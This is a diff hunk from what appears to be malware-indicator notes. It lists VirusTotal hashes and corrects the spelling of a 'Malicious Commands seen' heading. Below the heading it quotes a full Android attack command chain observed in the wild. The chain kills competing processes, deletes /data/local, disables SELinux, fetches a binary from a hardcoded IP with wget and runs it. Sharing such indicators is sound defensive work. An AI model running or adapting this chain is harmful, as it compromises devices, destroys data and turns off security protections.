@@ -16,7 +16,7 @@ https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46
 d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 toybox top -b -n 1 | awk '$9 > 20 {print $1}' | toybox xargs kill -9;toybox top -b -n 1 | awk '$9 > 20 {print $1}' | su 0 toybox xargs kill -9;toybox pkill -9 M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.28.33.96/and || su 0 busybox wget http://103.28.33.96/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
 
